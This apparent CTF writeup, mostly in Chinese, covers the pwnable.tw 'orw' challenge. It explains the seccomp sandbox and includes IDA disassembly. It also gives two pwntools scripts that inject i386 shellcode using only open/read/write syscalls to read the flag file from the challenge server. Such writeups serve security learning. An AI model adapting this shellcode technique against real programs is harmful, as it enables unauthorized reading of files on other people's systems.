---
title: Writeup of pwnable.tw之orw
date: 2020-03-21
tags: CTF,Writeup
---

题目显示Only `open` `read` `write` syscall are allowed to use.应该是使用了沙箱，

后门程序是用不成了，只能使用这三个函数直接读取flag。了

![](./orw.png)

使用IDA Pro反汇编程序：

```assembly
.text:08048548                 lea     ecx, [esp+4]
.text:0804854C                 and     esp, 0FFFFFFF0h
.text:0804854F                 push    dword ptr [ecx-4]
.text:08048552                 push    ebp
.text:08048553                 mov     ebp, esp
.text:08048555                 push    ecx
.text:08048556                 sub     esp, 4
.text:08048559                 call    orw_seccomp
.text:0804855E                 sub     esp, 0Ch
.text:08048561                 push    offset format   ; "Give my your shellcode:"
.text:08048566                 call    _printf
.text:0804856B                 add     esp, 10h
.text:0804856E                 sub     esp, 4
.text:08048571                 push    0C8h            ; nbytes
.text:08048576                 push    offset shellcode ; buf
.text:0804857B                 push    0               ; fd
.text:0804857D                 call    _read
.text:08048582                 add     esp, 10h
.text:08048585                 mov     eax, offset shellcode
.text:0804858A                 call    eax ; shellcode
.text:0804858C                 mov     eax, 0
.text:08048591                 mov     ecx, [ebp+var_4]
.text:08048594                 leave
.text:08048595                 lea     esp, [ecx-4]
.text:08048598                 retn
.text:08048598 ; } // starts at 8048548
.text:08048598 main            endp
```

可以得出整个程序的执行流程：

首先，在0x08048559地址处调用了orw_seccomp，那么这东西是干嘛的呢？

[sseccomp]([https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/#seccomp](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/#seccomp))

short for secure computing mode([wiki](https://en.wikipedia.org/wiki/Seccomp))是一种限制系统调用的安全机制，可以当沙箱用。在严格模式下只支持`exit()`，`sigreturn()`，`read()`和`write()`，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用[seccomp-tools](https://github.com/david942j/seccomp-tools)查看

在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用`seccomp_init`,`seccomp_rule_add`,`seccomp_load`来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。
首先，要使用它需要有`CAP_SYS_ADMIN`权能，否则就要设置`PR_SET_NO_NEW_PRIVS`位，若不这样做非root用户使用这个程序时`seccomp`保护将会失效！设置了`PR_SET_NO_NEW_PRIVS`位后能保证`seccomp`对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行`execve`这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用`ptctl`也不能再把它禁用掉。

然后程序接下来将shellcode读到.bss段的0x804a060地址处，然后接下来直接使用call指令跳转到该处执行。

直接写shellcode：

```python
from pwn import *
context(arch = "i386", os = "linux")
#p = process("./orw")
p = remote("chall.pwnable.tw", "10001")
ass = '''
         xor eax, eax
         push eax
         push 0x6761
         push 0x6c662f77
         push 0x726f2f65
         push 0x6d6f682f
         mov al, 0x05
         mov ebx, esp
         xor ecx, ecx
         int 0x80
         sub esp, 0x40
         mov ebx, eax
         mov al, 0x03
         mov ecx, esp
         mov dl, 0x40
         int 0x80
         mov al, 0x04
         mov bl, 0x01
         mov ecx, esp
         mov dl, 0x40
         int 0x80
      '''
shellcode = asm(ass)
p.recvuntil(":")
p.send(shellcode)
s = p.recv(0x40)
print s
```

后来看到网上有人写的：

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
myelf = ELF("./orw")
#io = process(myelf.path)
io  = remote("chall.pwnable.tw",10001)
shellcode = ""
shellcode += shellcraft.i386.pushstr('/home/orw/flag').rstrip()
shellcode += shellcraft.i386.linux.syscall('SYS_open',"esp", 0).rstrip()
shellcode += shellcraft.i386.linux.syscall('SYS_read',"eax", 0x0804A0D7,40).rstrip()
shellcode += shellcraft.i386.linux.syscall('SYS_write',1, 0x0804A0D7,40).rstrip()
#print shellcode
#print len(asm(shellcode))
io.recv()
io.send(asm(shellcode))
io.interactive()
```
